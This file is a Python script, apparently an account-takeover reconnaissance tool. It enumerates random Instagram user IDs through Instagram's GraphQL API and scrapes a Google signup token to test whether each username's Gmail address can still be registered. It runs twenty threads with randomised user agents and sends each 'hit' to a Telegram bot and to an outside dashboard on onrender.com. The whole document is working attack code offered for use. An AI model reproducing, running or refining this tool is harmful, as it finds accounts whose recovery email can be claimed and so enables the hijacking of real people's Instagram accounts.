import os, requests, sys, time, re, json, string, random, hashlib, uuid
from datetime import datetime
from threading import Thread, Lock
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
from colorama import init

init(autoreset=True)

# ================= FIXED DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Render Live URL - Dashboard stats sync
        url = 'https://system-override-v2.onrender.com/update_stats'
        requests.post(url, json={'type': stat_type}, timeout=3)
    except:
        pass

# Dashboard automatically passes ID and Token
if len(sys.argv) > 2:
    ID = sys.argv[1]
    token = sys.argv[2]
else:
    ID = input("\033[1;36mEnter ID: ")
    token = input("\033[1;36mEnter Token: ")
# =============================================================

hit_count = bad_count = 0
stats_lock = Lock()
TOKEN_FILE = 'tl.txt'
E = '\033[1;32m'; Z = '\033[1;31m'

def get_google_token():
    """Initial Google Token Setup for Gmail Checking"""
    try:
        n1 = ''.join(cc('azertyuiop') for _ in range(rr(6,9)))
        n2 = ''.join(cc('azertyuiop') for _ in range(rr(3,9)))
        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB')
        match = re.search(r'data-initial-setup-data=".*?&quot;(.*?)&quot;', res1.text)
        if match:
            tok = match.group(1)
            host = ''.join(cc('abcdefghijklmnopqrstuvwxyz') for _ in range(20))
            with open(TOKEN_FILE, 'w') as f: f.write(f"{tok}//{host}")
        else:
            time.sleep(2)
            get_google_token()
    except:
        time.sleep(2)
        get_google_token()

if not os.path.exists(TOKEN_FILE):
    get_google_token()

def check_gmail(email_prefix):
    global hit_count, bad_count
    try:
        if not os.path.exists(TOKEN_FILE): get_google_token()
        with open(TOKEN_FILE, 'r') as f:
            tl, host = f.read().split('//')
        headers = {'google-accounts-xsrf': '1', 'user-agent': gg()}
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        res = requests.post('https://accounts.google.com/_/signup/usernameavailability', headers=headers, data=data, cookies={'__Host-GAPS': host})
        
        if '"gf.uar",1' in res.text:
            with stats_lock: hit_count += 1
            send_to_dashboard('hit')
            return True
        else:
            with stats_lock: bad_count += 1
            send_to_dashboard('bad')
            return False
    except: return False

def send_hit_telegram(username):
    msg = f"""
━━━━━━━━━━━━━━━
🔥 TEAM TX CORE HIT!
👤 USER: @{username}
📧 EMAIL: {username}@gmail.com
📅 TYPE: Active Scan
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    print(E + msg)
    try:
        # Fixed: No brackets [] for clean API delivery
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}", timeout=10)
    except: pass

def worker():
    while True:
        try:
            lsd = ''.join(cc(string.ascii_letters + string.digits) for _ in range(16))
            # Core ID range for active accounts
            id_range = str(rr(100000000, 3000000000))
            headers = {'user-agent': gg(), 'x-fb-lsd': lsd}
            data = {'lsd': lsd, 'variables': f'{{"id":"{id_range}","render_surface":"PROFILE"}}', 'doc_id': '7397388303713986'}
            
            res = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()
            user = res.get('data', {}).get('user', {})
            username = user.get('username')
            
            if username:
                if check_gmail(username):
                    send_hit_telegram(username)
            else:
                send_to_dashboard('bad')
        except:
            time.sleep(1)

# Threads - 20 threads for maximum speed
for _ in range(20):
    Thread(target=worker, daemon=True).start()

while True:
    time.sleep(10)
